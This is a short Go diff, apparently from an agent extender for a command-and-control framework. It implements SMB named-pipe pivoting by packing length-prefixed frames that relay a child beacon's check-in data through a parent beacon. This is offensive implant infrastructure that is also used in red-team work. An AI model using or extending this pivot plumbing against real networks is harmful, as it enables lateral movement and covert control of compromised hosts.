@@ -784,8 +784,19 @@ func (e *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.T
 	return packData, nil
 }
 
+// PivotPackData: pack one frame for the SMB named-pipe pivot —
+// `u32 LE len || data` (docs/WIRE.md, section Pivot). The child beacon
+// reads the frame on the pipe and treats `data` as its check-in payload;
+// delivered as proxy data (no dialog, no ack rendering on the parent).
 func (e *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
-	return adaptix.TaskData{}, errors.New("specter-rs pivots land with the SMB transport (phase 3+)")
+	_ = pivotId
+	if len(data) == 0 || len(data) > 0x10000 {
+		return adaptix.TaskData{}, errors.New("pivot frame size out of range")
+	}
+	frame := make([]byte, 4+len(data))
+	binary.LittleEndian.PutUint32(frame, uint32(len(data)))
+	copy(frame[4:], data)
+	return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: frame, Sync: false}, nil
 }
 
 // CreateCommand: the operator command surface (native beacon_agent
